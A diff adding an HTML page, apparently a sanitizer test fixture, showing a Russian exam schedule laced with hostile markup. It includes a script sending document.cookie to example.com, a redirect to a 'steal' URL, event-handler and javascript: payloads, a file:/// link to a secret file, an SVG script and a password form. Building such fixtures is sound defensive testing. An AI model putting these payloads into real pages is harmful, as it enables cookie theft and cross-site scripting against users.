@@ -1,0 +1,39 @@
+<!DOCTYPE html>
+<html lang="ru">
+<head>
+<meta charset="utf-8">
+<meta http-equiv="refresh" content="0; url=https://example.com/steal">
+<base href="https://example.com/">
+<title>Расписание экзаменов</title>
+<link rel="stylesheet" href="https://example.com/site.css">
+<style>body { background: url(https://example.com/track.png) } .x { color: red }</style>
+<script>document.location = 'https://example.com/?c=' + document.cookie;</script>
+</head>
+<body onload="alert(1)" style="color:#000">
+<h1 class="title" style="color:red">Расписание экзаменов &mdash; осень 2026</h1>
+<p align="center">Қазақ тілі: әліпби, ұлттық, үшін. <b>Важно</b>, <i>курсив</i> &amp; x<sup>2</sup>.</p>
+<script type="text/javascript">
+  var html = "<p>не текст</p></div>";
+</script>
+<noscript>Включите JavaScript.</noscript>
+<ul>
+  <li>Первый пункт
+  <li>Второй пункт <a href="https://www.kaznu.kz/" onclick="steal()">Сайт КазНУ</a>
+  <li><a href="javascript:alert(1)">Опасная ссылка</a> и <a href="file:///sdcard/secret.txt">файл</a>
+</ul>
+<table border="1" onmouseover="x()">
+  <caption>Экзамены</caption>
+  <tr><th>Дисциплина</th><th colspan="2">Дата и аудитория</th></tr>
+  <tr><td rowspan="2">Криптография</td><td>15.10.2026</td><td>ГУК-301</td></tr>
+  <tr><td>16.10.2026</td><td>ГУК-302</td></tr>
+</table>
+<p>Картинка с сайта: <img src="https://example.com/pixel.gif" alt="логотип"> и встроенная:
+<img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVR42mNk+M9QDwADhgGAWjR9awAAAABJRU5ErkJggg==" alt="точка" onerror="x()"></p>
+<iframe src="https://example.com/frame"></iframe>
+<object data="https://example.com/flash.swf"><p>Объект</p></object>
+<svg><script>alert(2)</script><text>вектор</text></svg>
+<form action="https://example.com/login" method="post"><input name="password" value="секрет"><button type="submit">Войти</button>
+<p>Текст внутри формы остаётся.</p></form>
+<div style="background-image:url(https://example.com/bg.png)">Конец страницы.</div>
+</body>
+</html>
